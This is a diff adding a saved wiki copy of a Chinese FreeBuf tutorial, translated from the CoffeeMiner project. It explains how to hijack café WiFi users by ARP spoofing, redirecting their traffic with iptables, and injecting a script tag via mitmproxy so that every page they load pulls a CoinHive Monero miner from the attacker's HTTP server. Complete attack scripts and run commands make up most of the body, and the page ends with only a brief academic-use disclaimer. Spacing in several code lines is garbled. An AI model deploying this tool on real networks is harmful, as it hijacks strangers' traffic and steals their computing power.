@@ -1,0 +1,398 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2018-01-25T08:05:40+08:00
+
+====== 如何搭建一个假的星巴克热点并劫持用户电脑进行挖矿 ======
+Created Thursday 25 January 2018
+
+如何搭建一个假的星巴克热点并劫持用户电脑进行挖矿（内附完整代码和教程） Alpha_h4ck2018-01-24共52835人围观 ，发现 1 个不明物体 网络安全
+
+http://www.freebuf.com/articles/network/161236.html
+
+0.png
+
+写在前面的话
+
+在几周之前，我看到了FB发布的[这篇文章](http://www.freebuf.com/news/157797.html)，这篇文章讲述了黑客利用咖啡店WiFi网络入侵用户设备并实现挖矿的故事，而我个人也认为这是一种实现挖矿攻击的新方法。
+
+本文的目的是为了给大家介绍如何利用中间人攻击（MitM）来向html页面中注入JavaScript代码，然后强制目标设备连接到恶意WiFi网络并为攻击者挖矿。
+
+1.png
+
+接下来，我们会使用一个脚本来执行WiFi网络自动化攻击，我们将其成为CoffeeMiner，因为它可以用来对咖啡店的WiFi网络实施攻击。
+
+一、攻击场景
+
+在本文所要介绍的攻击场景中，需要有多台设备接入到WiFi网络，而CoffeeMiner攻击者需要拦截目标用户与路由器之间的网络通信数据。
+
+2.png
+
+1.1  场景配置
+
+在真正的攻击场景中，WiFi路由器通常会连接笔记本电脑以及智能手机。我们在真实场景中进行了测试，并且攻击工具可以正常工作。但是在这篇文章中，我们将详细介绍虚拟环境的搭建与配置。
+
+我们将使用VirtualBox来部署我们的虚拟攻击场景。【VirtualBox传送门】
+
+首先，我们需要下载Linux安装镜像，然后安装到VirtualBox虚拟机中，本文将使用Kali Linux镜像。【Kali传送门】
+
+ISO镜像下载完成之后，我们需要准备三台VBox虚拟机，并安装好Linux系统。这三台虚拟机所扮演的角色如下：
+
+-受害者：连接到路由器并浏览一些网页。
+
+-攻击者：运行CoffeeMiner，并执行中间人攻击。
+
+-路由器/网关：跟普通网关功能一样。
+
+3.png
+
+攻击开始后，场景如下所示：
+
+4.png
+
+每台虚拟机的配置如下：
+
+受害者
+
+网络适配器：
+
+eth0:Host-only Adapter
+/etc/network/interfaces:
+
+auto lo
+iface lo inet loopback
+auto eth0
+iface eth0 inet static
+address 10.0.2.10
+netmask 255.255.255.0
+gateway 10.0.2.15
+攻击者
+
+网络适配器：
+
+eth0:Host-only Adapter
+/etc/network/interfaces:
+
+autolo
+iface lo inet loopback
+auto eth0
+iface eth0 inet static
+address 10.0.2.20
+netmask 255.255.255.0
+gateway 10.0.2.15
+路由器/网关
+
+网络适配器：
+
+eth0:Bridged Adapter
+eth1:Host-only Adapter
+/etc/network/interfaces:
+auto lo
+iface lo inet loopback
+auto eth0
+iface eth0 inet dhcp
+auto eth1
+iface eth1 inet static
+address 10.0.2.15
+netmask 255.255.255.0
+二、CoffeeMiner介绍
+
+2.1 ARP欺骗
+
+为了执行ARP欺骗攻击，我们将使用dsniff库：
+
+arpspoof-i interface -t ipVictim ipGateway
+arpspoof-i interface -t ipGateway ipVictim
+2.2 mitmproxy
+
+mitmproxy这款软件工具可以帮我们分析流经主机的通信数据，并允许我们对流量数据进行编辑修改。而在我们的场景中，我们将用它来向html页面中注入JavaScript代码。为了演示方便，我们将在html页面中注入一行代码，而这行html代码将会调用JS挖矿工具：
+
+<script src="http://httpserverIP:8000/script.js"></script>
+2.3 代码注入
+
+当我们拦截下了目标用户的流量之后，我们需要向其中注入脚本代码，这里我们使用的是mitmproxy API来实现：
+
+from bs4 import BeautifulSoup
+from mitmproxy import ctx, http
+import argparse
+class Injector:
+def __init__(self, path):
+self.path = path
+def response(self, flow: http.HTTPFlow)-> None:
+if self.path:
+html = BeautifulSoup(flow.response.content,"html.parser")
+print(self.path)
+print(flow.response.headers["content-type"])
+ifflow.response.headers["content-type"] == 'text/html':
+script = html.new_tag(
+"script",
+src=self.path,
+type='application/javascript')
+html.body.insert(0, script)
+flow.response.content =str(html).encode("utf8")
+print("Scriptinjected.")
+def start():
+parser = argparse.ArgumentParser()
+parser.add_argument("path",type=str)
+args = parser.parse_args()
+return Injector(args.path)
+2.4 HTTP服务器
+
+注入了html代码之后，它将会调用我们的JavaScript挖矿工具。所以接下来，我们需要在HTTP服务器中托管脚本文件。HTTP服务器需要在攻击者端配置，我们这里使用Python的‘http.server’库：
+
+#!/usr/bin/envpython
+impor thttp.server
+import socketserver
+import os
+PORT= 8000
+web_dir= os.path.join(os.path.dirname(__file__), 'miner_script')
+os.chdir(web_dir)
+Handler= http.server.SimpleHTTPRequestHandler
+httpd= socketserver.TCPServer(("", PORT), Handler)
+print("servingat port", PORT)
+httpd.serve_forever()
+上述代码可以迅速搭建一台简单的HTTP服务器，并负责向目标用户发送我们的JS挖矿工具。JavaScript脚本存放在/miner_script目录中，本文将使用CoinHive作为JavaScript挖矿工具。
+
+2.5 CoinHive
+
+[CoinHive](https://coinhive.com/)是一种专门挖门罗币（[Monero](https://coinmarketcap.com/es/currencies/monero/)）的JavaScript挖矿工具，它可以直接注入到网站之中，并利用目标设备的CPU算力来挖门罗币（基于[CryptoNote](https://cryptonote.org/)协议）。
+
+在我们的实验场景中，我们会将挖矿代码注入到目标用户所请求的每一个HTML页面之中，然后建立持久性的会话并计算哈希（挖门罗币）。
+
+5.png
+
+三、脚本代码整合
+
+首先，我们需要配置ip_forwarding和IPTABLES，并将攻击者的设备打造成代理：
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables-t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables-t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+为了执行ARP欺骗攻击，我们需要准备一份“victims.txt”文件并存储所有的目标用户IP地址。下列Python代码可以帮我们完成IP地址的读取任务：
+
+# get gateway_ip
+gateway= sys.argv[1]
+print("gateway:" + gateway)
+# getvictims_ip
+victims= [line.rstrip('\n') for line in open("victims.txt")]
+print("victims:")
+print(victims)
+# runthe arpspoof for each victim, each one in a new console
+for victim in victims:
+os.system("xterm -e arpspoof -i eth0 -t " + victim + "" + gateway + " &")
+os.system("xterm -e arpspoof -i eth0-t " + gateway + " " + victim + " &")
+ARP欺骗攻击开始后，我们还需要运行HTTP服务器：
+
+>python3 httpServer.py
+现在我们就可以用injector.py来运行mitmproxy了：
+
+>mitmdump -s 'injector.py http://httpserverIP:8000/script.js'
+3.1 CoffeeMiner+最终的脚本代码
+
+‘coffeeMiner.py’完整的脚本代码如下：
+
+import os
+import sys
+#get gateway_ip (router)
+gateway= sys.argv[1]
+print("gateway:" + gateway)
+# get victims_ip
+victims= [line.rstrip('\n') for line in open("victims.txt")]
+print("victims:")
+print(victims)
+#configure routing (IPTABLES)
+os.system("echo1 > /proc/sys/net/ipv4/ip_forward")
+os.system("iptables-t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+os.system("iptables-t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port8080")
+os.system("iptables-t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port8080")
+# runthe arpspoof for each victim, each one in a new console
+for victim in victims:
+os.system("xterm -e arpspoof -i eth0-t " + victim + " " + gateway + " &")
+os.system("xterm -e arpspoof -i eth0-t " + gateway + " " + victim + " &")
+#start the http server for serving the script.js, in a new console
+os.system("xterm-hold -e 'python3 httpServer.py' &")
+#start the mitmproxy
+os.system("~/.local/bin/mitmdump-s 'injector.py http://10.0.2.20:8000/script.js' -T")
+‘injector.py’脚本代码如下：
+
+from bs4 import BeautifulSoup
+from mitmproxy import ctx, http
+import argparse
+class Injector:
+def __init__(self, path):
+self.path = path
+def response(self, flow: http.HTTPFlow)-> None:
+if self.path:
+html = BeautifulSoup(flow.response.content,"html.parser")
+print(self.path)
+print(flow.response.headers["content-type"])
+ifflow.response.headers["content-type"] == 'text/html':
+print(flow.response.headers["content-type"])
+script = html.new_tag(
+"script",
+src=self.path,
+type='application/javascript')
+html.body.insert(0, script)
+flow.response.content =str(html).encode("utf8")
+print("Scriptinjected.")
+def start():
+parser = argparse.ArgumentParser()
+parser.add_argument("path",type=str)
+args = parser.parse_args()
+return Injector(args.path)
+脚本的运行命令如下：
+
+>python3 coffeeMiner.py RouterIP
+四、攻击演示
+
+如果我们想要手动实现攻击的话，我们需要按照下图进行配置：
+
+6.png
+
+接下来，当ARP欺骗攻击完成之后（并且HTTP服务器和注入代码随时待命），我们就需要让目标用户的设备去浏览一个网页，而目标用户的流量经过攻击者设备时，便会触发代码注入：
+
+7.png
+
+此时，当目标用户浏览这个HTML页面时，攻击者所注入的代码将会被运行。
+
+4.1 演示视频
+
+在下面的视频中，我们将演示如何使用coffeeMiner.py脚本来实施完整的攻击。
+
+VirtualBoxDemo：
+
+视频地址：https://www.youtube.com/watch?v=wmYJ6Z4LoCA
+
+WiFi网络以及笔记本电脑Demo：
+
+视频地址：https://www.youtube.com/watch?v=-TnzGLUD0DU
+
+总结
+
+正如本文所介绍的那样，攻击者可以轻松地对一个WiFi网络进行自动化攻击，并且还可以通过WiFi网络来让受害者的计算设备帮助自己进行挖矿。在真实的攻击场景中，如果配合高功率WiFi天线的话，攻击的覆盖范围可能还会更大。
+
+本文中完整的项目代码可以从我们的GitHub代码库中获取：[GitHub传送门](https://github.com/arnaucode/coffeeMiner)
+
+参考资料
+
+中文：
+
+1.   http://www.4hou.com/wireless/9773.html
+
+2.   https://www.ithome.com.tw/news/120449
+
+英文：
+
+1.   https://www.theregister.co.uk/2018/01/05/wi_fi_crypto_mining/
+
+2.   http://securityaffairs.co/wordpress/67438/hacking/coffeeminer-hacking-wifi-cryptocurrency.html
+
+3.   https://gbhackers.com/coffeeminer-hacking-wifi/
+
+4.   https://www.privateinternetaccess.com/blog/2018/01/stop-coffeeminer-tool-injects-cryptocurrency-miner-html-requests-wifi-hotspots/
+
+5.   http://www.zdnet.com/article/how-to-hack-public-wi-fi-to-mine-for-cryptocurrency/
+
+6.   https://sensorstechforum.com/coffeeminer-malware-virus-detect-remove/
+
+7.   http://turningtrend.com/how-to-hack-public-wi-fi-to-mine-for-cryptocurrency/
+
+8.   https://www.theissue.com/technology/coffeeminer-demonstrates-how-hijackers-can-use-public-wi-fi-networks-to-mine-cryptocurrency
+
+9.   https://koddos.net/blog/hackers-use-coffeeminer-hijack-public-wifi-hotspots-mine-cryptocurrency/?utm_source=Sociallymap&utm_medium=Sociallymap&utm_campaign=Sociallymap
+
+10.  http://nymag.com/selectall/2018/01/coffeeminer-allows-hackers-to-mine-bitcoin-on-public-wi-fi.html
+
+11.  https://medium.com/computerist/beware-coffeeminer-project-lets-you-hack-public-wi-fi-to-mine-cryptocoins-1915624c2ea5
+
+12.  https://resiliencepost.com/2018/01/12/coffeeminer-forces-coffee-shop-visitors-to-mine-for-monero/
+
+13.  https://fossbytes.com/coffeeminer-attack-wifi-attack-cryptomining/
+
+14.  https://cryptovest.com/news/coffeeminer-you-can-do-cryptojacking-on-any-public-wi-fi-network-using-this-tool/
+
+15.  https://securityboulevard.com/2018/01/coffeeminer-poc-targets-public-wi-fi-networks-to-mine-for-cryptocurrency/
+
+16.  https://latesthackingnews.com/2018/01/07/hacking-wireless-networks-use-coffeeminer-inject-cryptocurrency-miners/
+
+17.  https://nakedsecurity.sophos.com/2018/01/09/coffeeminer-project-lets-you-hack-public-wi-fi-to-mine-cryptocoins/
+
+18.  https://hotforsecurity.bitdefender.com/blog/coffeeminer-poc-targets-public-wi-fi-networks-to-mine-for-cryptocurrency-19414.html
+
+19.  https://www.helpnetsecurity.com/2018/01/08/public-wifi-cryptocurrency-mining/
+
+20.  https://www.infosecurity-magazine.com/news/coffeeminer-mine-for-monero/
+
+21.  http://www.ibtimes.co.uk/what-coffeeminer-new-attack-lets-hackers-hijack-public-wifi-networks-mine-cryptocurrency-1654320
+
+西班牙语：
+
+1.   https://blogs.protegerse.com/2018/01/10/coffeeminer-minando-criptodivisas-sin-autorizacion-usando-la-wifi-como-vector-de-ataque/
+
+2.   http://noticiasseguridad.com/seguridad-informatica/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/
+
+3.   https://www.redeszone.net/2018/01/06/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/
+
+4.   https://terabytezone.com/coffeeminer-minado-criptomonedas-redes-wifi/
+
+5.   http://www.nexusmovil.com/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/
+
+6.   https://www.coincrispy.com/2018/01/10/coffeeminer-ataque-mineria-criptomonedas/
+
+7.   https://www.criptonoticias.com/seguridad/coffeeminer-secuestra-redes-publicas-wi-fi-para-minar-criptomonedas/
+
+俄语：
+
+1.   https://forklog.com/ispanskij-issledovatel-razrabotal-majner-dlya-publichnyh-wi-fi-setej/
+
+2.   https://coinsider.com/p/news/2542-coffeeminer-novaya-programma-dlya-skrytogo-majninga-kriptovalyuty
+
+3.   https://iguru.gr/166819/monero-mining-free-wi-fi/
+
+4.   https://xakep.ru/2018/01/10/coffeeminer/
+
+意大利语：
+
+1.   http://cybersecurity.startupitalia.eu/56384-20180108-coffeeminer-hackerare-le-reti-wifi-produrre-criptovalute
+
+保加利亚语：
+
+1.   https://questona.com/coffeeminer-wifi/
+
+希腊语：
+
+1.   https://www.youbrandinc.com/crytocurrency/%CF%80%CE%B1%CF%81%CE%B1%CE%B2%CE%B9%CE%AC%CF%83%CF%84%CE%B5-%CF%84%CE%BF-free-wi-fi-%CF%84%CE%B7%CF%82-%CE%B3%CE%B5%CE%B9%CF%84%CE%BF%CE%BD%CE%B9%CE%AC%CF%82-%CF%83%CE%B1%CF%82-%CE%B3%CE%B9%CE%B1-mon/
+
+土耳其语：
+
+1.   http://blog.cyberage.com.tr/2018/01/10/coffeeminer/
+
+荷兰语：
+
+1.   https://www.smartbiz.be/nieuws/173781/hoe-een-publiek-wifi-netwerk-kan-worden-gehackt-om-cryptomunten-te-minen/
+
+相关推文
+
+@defconhttps://twitter.com/defcon/status/949679959509012480
+
+@x0rzhttps://twitter.com/x0rz/status/948865836609130496
+
+@avast_antivirushttps://twitter.com/avast_antivirus/status/951835917815308288
+
+@fullstackpythonhttps://twitter.com/fullstackpython/status/949707681543213057
+
+@alienvaulthttps://twitter.com/alienvault/status/950449599872929792
+
+@binitamshahhttps://twitter.com/binitamshah/status/951520444900818945
+
+@_odisseushttps://twitter.com/_odisseus/status/951052521967144960
+
+8.png
+
+免责声明：本文所介绍的内容仅限用于学术研究，请不要将其用于恶意目的。
+
+* 参考来源：arnaucode，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM
+
+Alpha_h4ck
+Alpha_h4ck
+383 篇文章
+等级： 9级
